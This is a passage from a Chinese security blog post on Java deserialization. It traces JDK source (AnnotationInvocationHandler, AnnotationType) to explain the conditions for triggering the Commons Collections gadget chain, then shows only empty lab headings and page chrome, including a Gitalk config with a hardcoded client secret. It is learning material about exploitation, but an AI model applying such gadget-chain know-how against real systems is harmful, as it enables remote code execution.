class="hljs-keyword">instanceof</span> ExceptionProxy)) &#123;<br>                    memberValue.setValue(<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationTypeMismatchExceptionProxy</span>(<br>                            value.getClass() + <span class="hljs-string">&quot;[&quot;</span> + value + <span class="hljs-string">&quot;]&quot;</span>).setMember(<br>                                annotationType.members().get(name)));<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>显然要走到最后的setValue()需要经过一个if判断，要求memberType非空，memberType是要以name变量为参数调用get()方法获取，意味着name变量不能为空，那name变量是什么？继续往上看，name是从memberValue中获取键，memberValue是一个键值对，遍历于memberValues，memberValues是在构造函数中被赋值的，就是我们传入的Map对象，也就是transformedMap</p>
<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231124172054469.png"></p>
<p>因此put上去的map的键，最终是“value”，memberTypes去get()获取”value”这个成员，那memberTypes是什么呢？</p>
<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231124221325557.png"></p>
<p>是调用了annotationType的memberTypes()方法，那annotationType是怎么定义的</p>
<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231124222409538.png"></p>
<p>把我们传入的注解作为参数了，瞅一眼实现类AnnotationType的构造函数：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-title function_">AnnotationType</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;? extends Annotation&gt; var1)</span> &#123;<br>    <span class="hljs-keyword">if</span> (!var1.isAnnotation()) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;Not an annotation type&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        Method[] var2 = (Method[])AccessController.doPrivileged(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PrivilegedAction</span>&lt;Method[]&gt;() &#123;<br>            <span class="hljs-keyword">public</span> Method[] run() &#123;<br>                <span class="hljs-keyword">return</span> var1.getDeclaredMethods();<br>            &#125;<br>        &#125;);<br>        <span class="hljs-built_in">this</span>.memberTypes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>(var2.length + <span class="hljs-number">1</span>, <span class="hljs-number">1.0F</span>);<br>        <span class="hljs-built_in">this</span>.memberDefaults = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>(<span class="hljs-number">0</span>);<br>        <span class="hljs-built_in">this</span>.members = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>(var2.length + <span class="hljs-number">1</span>, <span class="hljs-number">1.0F</span>);<br>        Method[] var3 = var2;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">var4</span> <span class="hljs-operator">=</span> var2.length;<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">var5</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; var5 &lt; var4; ++var5) &#123;<br>            <span class="hljs-type">Method</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> var3[var5];<br>            <span class="hljs-keyword">if</span> (var6.getParameterTypes().length != <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(var6 + <span class="hljs-string">&quot; has params&quot;</span>);<br>            &#125;<br><br>            <span class="hljs-type">String</span> <span class="hljs-variable">var7</span> <span class="hljs-operator">=</span> var6.getName();<br>            <span class="hljs-type">Class</span> <span class="hljs-variable">var8</span> <span class="hljs-operator">=</span> var6.getReturnType();<br>            <span class="hljs-built_in">this</span>.memberTypes.put(var7, invocationHandlerReturnType(var8));<br>            <span class="hljs-built_in">this</span>.members.put(var7, var6);<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">var9</span> <span class="hljs-operator">=</span> var6.getDefaultValue();<br>            <span class="hljs-keyword">if</span> (var9 != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-built_in">this</span>.memberDefaults.put(var7, var9);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (var1 != Retention.class &amp;&amp; var1 != Inherited.class) &#123;<br>            <span class="hljs-type">JavaLangAccess</span> <span class="hljs-variable">var10</span> <span class="hljs-operator">=</span> SharedSecrets.getJavaLangAccess();<br>            <span class="hljs-type">Map</span> <span class="hljs-variable">var11</span> <span class="hljs-operator">=</span> AnnotationParser.parseSelectAnnotations(var10.getRawClassAnnotations(var1), var10.getConstantPool(var1), var1, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Retention.class, Inherited.class&#125;);<br>            <span class="hljs-type">Retention</span> <span class="hljs-variable">var12</span> <span class="hljs-operator">=</span> (Retention)var11.get(Retention.class);<br>            <span class="hljs-built_in">this</span>.retention = var12 == <span class="hljs-literal">null</span> ? RetentionPolicy.CLASS : var12.value();<br>            <span class="hljs-built_in">this</span>.inherited = var11.containsKey(Inherited.class);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-built_in">this</span>.retention = RetentionPolicy.RUNTIME;<br>            <span class="hljs-built_in">this</span>.inherited = <span class="hljs-literal">false</span>;<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>var3是注解类中成员方法的集合，（比如Target下的value()）</p>
<h4 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h4><h2 id="JavaDeserializeLabs"><a href="#JavaDeserializeLabs" class="headerlink" title="JavaDeserializeLabs"></a>JavaDeserializeLabs</h2><h3 id="lab1-basic"><a href="#lab1-basic" class="headerlink" title="lab1-basic"></a>lab1-basic</h3><h3 id="lab2-ysoserial"><a href="#lab2-ysoserial" class="headerlink" title="lab2-ysoserial"></a>lab2-ysoserial</h3><h3 id="lab3-shiro-jrmp"><a href="#lab3-shiro-jrmp" class="headerlink" title="lab3-shiro-jrmp"></a>lab3-shiro-jrmp</h3><h3 id="lab4-shiro-blind"><a href="#lab4-shiro-blind" class="headerlink" title="lab4-shiro-blind"></a>lab4-shiro-blind</h3><h3 id="lab5-weblogic-readResolve"><a href="#lab5-weblogic-readResolve" class="headerlink" title="lab5-weblogic-readResolve"></a>lab5-weblogic-readResolve</h3><h3 id="lab6-weblogic-resolveProxyClass"><a href="#lab6-weblogic-resolveProxyClass" class="headerlink" title="lab6-weblogic-resolveProxyClass"></a>lab6-weblogic-resolveProxyClass</h3><h3 id="lab7-weblogic-UnicastRef"><a href="#lab7-weblogic-UnicastRef" class="headerlink" title="lab7-weblogic-UnicastRef"></a>lab7-weblogic-UnicastRef</h3><h3 id="lab8-jrmp-unicastRemoteObject"><a href="#lab8-jrmp-unicastRemoteObject" class="headerlink" title="lab8-jrmp-unicastRemoteObject"></a>lab8-jrmp-unicastRemoteObject</h3><h3 id="lab9-proxy"><a href="#lab9-proxy" class="headerlink" title="lab9-proxy"></a>lab9-proxy</h3></div><div class="article-licensing box"><div class="licensing-title"><p>反序列化</p><p><a href="http://potatowo233.github.io/2023/02/09/反序列化/">http://potatowo233.github.io/2023/02/09/反序列化/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>作者</h6><p>Potat0w0</p></div></div><div class="level-item is-narrow"><div><h6>发布于</h6><p>2023-02-09</p></div></div><div class="level-item is-narrow"><div><h6>更新于</h6><p>2024-02-05</p></div></div><div class="level-item is-narrow"><div><h6>许可协议</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><hr style="height:1px;margin:1rem 0"><div class="level is-mobile is-flex"><div class="article-tags is-size-7 is-uppercase"><i class="fas fa-tags has-text-grey"></i> <a class="link-muted" rel="tag" href="/tags/WEB/">WEB </a></div></div><!--!--></article></div><div class="card"><div class="card-content"><h3 class="menu-label has-text-centered">喜欢这篇文章？打赏一下作者吧</h3><div class="buttons is-centered"><a class="button donate" href="/" target="_blank" rel="noopener" data-type="afdian"><span class="icon is-small"><i class="fas fa-charging-station"></i></span><span>爱发电</span></a><a class="button donate" data-type="alipay"><span class="icon is-small"><i class="fab fa-alipay"></i></span><span>支付宝</span><span class="qrcode"><img src="/img/alipay.jpg" alt="支付宝"></span></a><a class="button donate" data-type="wechat"><span class="icon is-small"><i class="fab fa-weixin"></i></span><span>微信</span><span class="qrcode"><img src="/img/wechatpay.png" alt="微信"></span></a></div></div></div><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2023/02/09/XSS/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">XSS</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2023/02/08/HELLO/"><span class="level-item">HELLO</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">评论</h3><div id="comment-container"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css"><script src="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js"></script><script>var gitalk = new Gitalk({
            id: "02882bbc21ab37ccc720394913cd3a41",
            repo: "blog_comments",
            owner: "Potatowo233",
            clientID: "de106bfe6211fc3ceedc",
            clientSecret: "2b3fe4ea85fc7d402cf3c84e18d1e9ae175f1e2d",
            admin: ["Potatowo233"],
            createIssueManually: false,
            distractionFreeMode: false,
            perPage: 20,
            pagerDirection: "last",
            
            
            enableHotKey: true,
            language: "zh-CN",
        })
        gitalk.render('comment-container')</script></div></div></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1 is-sticky"><div class="card is-hidden-mobile" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="/img/head.jpg" alt="Potat0w0"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">Potat0w0</p><p class="is-size-6 is-block">Nice t0 th3 Intern3t</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>Fuzhou,China</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">42</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">18</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">8</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://space.bilibili.com/26346947" target="_blank" rel="noopener">关注我</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/Potatowo233"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Facebook" href="https://facebook.com"><i class="fab fa-facebook"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Twitter" href="https://twitter.com"><i class="fab fa-twitter"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="RSS" href="/rss.xml"><i class="fas fa-rss"></i></a></div></div></div><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">目录</h3><ul class="menu-list"><ul class="menu-list"><li><a class="level is-mobile" href="#2023-HZNUCTF-ppppop"><span class="level-left"><span class="level-item">2023 HZNUCTF ppppop</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#call"><span class="level-left"><span class="level-item">__call():</span></span></a></li><li><a class="level is-mobile" href="#destruct"><span class="level-left"><span class="level-item">__destruct():</span></span></a></li><li><a class="level is-mobile" href="#construct"><span class="level-left"><span class="level-item">__construct():</span></span></a></li></ul></li><li><a class="level is-mobile" href="#2023ROIS冬令营week4-babyphp"><span class="level-left"><span class="level-item">2023ROIS冬令营week4 babyphp</span></span></a></li><li><a class="level is-mobile" href="#2023安洵杯easy-unserialize"><span class="level-left"><span class="level-item">2023安洵杯easy_unserialize</span></span></a></li></ul><li><a class="level is-mobile" href="#Java反序列化"><span class="level-left"><span class="level-item">Java反序列化</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#基础知识："><span class="level-left"><span class="level-item">基础知识：</span></span></a></li><li><a class="level is-mobile" href="#URLDNS"><span class="level-left"><span class="level-item">URLDNS:</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#反射："><span class="level-left"><span class="level-item">反射：</span></span></a></li><li><a class="level is-mobile" href="#利用反射调URLDNS链："><span class="level-left"><span class="level-item">利用反射调URLDNS链：</span></span></a></li><li><a class="level is-mobile" href="#JDK代理："><span class="level-left"><span class="level-item">JDK代理：</span></span></a></li><li><a class="level is-mobile" href="#Common-Collections："><span class="level-left"><span class="level-item">Common Collections：</span></span></a></li></ul></li><li><a class="level is-mobile" href="#JavaDeserializeLabs"><span class="level-left"><span class="level-item">JavaDeserializeLabs</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#lab1-basic"><span class="level-left"><span class="level-item">lab1-basic</span></span></a></li><li><a class="level is-mobile" href="#lab2-ysoserial"><span class="level-left"><span class="level-item">lab2-ysoserial</span></span></a></li><li><a class="level is-mobile" href="#lab3-shiro-jrmp"><span class="level-left"><span class="level-item">lab3-shiro-jrmp</span></span></a></li><li><a class="level is-mobile" href="#lab4-shiro-blind"><span class="level-left"><span class="level-item">lab4-shiro-blind</span></span></a></li><li><a class="level is-mobile" href="#lab5-weblogic-readResolve"><span class="level-left"><span class="level-item">lab5-weblogic-readResolve</span></span></a></li><li><a class="level is-mobile" href="#lab6-weblogic-resolveProxyClass"><span class="level-left"><span class="level-item">lab6-weblogic-resolveProxyClass</span></span></a></li><li><a class="level is-mobile" href="#lab7-weblogic-UnicastRef"><span class="level-left"><span class="level-item">lab7-weblogic-UnicastRef</span></span></a></li><li><a class="level is-mobile" href="#lab8-jrmp-unicastRemoteObject"><span class="level-left"><span class="level-item">lab8-jrmp-unicastRemoteObject</span></span></a></li><li><a class="level is-mobile" href="#lab9-proxy"><span class="level-left"><span class="level-item">lab9-proxy</span></span></a></li></ul></li></ul></li></ul></div></div><style>#toc .menu-list > li > a.is-active + .menu-list { display: block; }#toc .menu-list > li > a + .menu-list { display: none; }</style><script src="/js/toc.js" defer></script></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/title.png" alt="Potat0w0" height="28"></a><p class="is-size-7"><span>&copy; 2024 Potat0w0</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p><p class="is-size-7">©❤POTATO</p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("zh-cn");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "此网站使用Cookie来改善您的体验。",
          dismiss: "知道了！",
          allow: "允许使用Cookie",
          deny: "拒绝",
          link: "了解更多",
          policy: "Cookie政策",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
        });</script></body></html>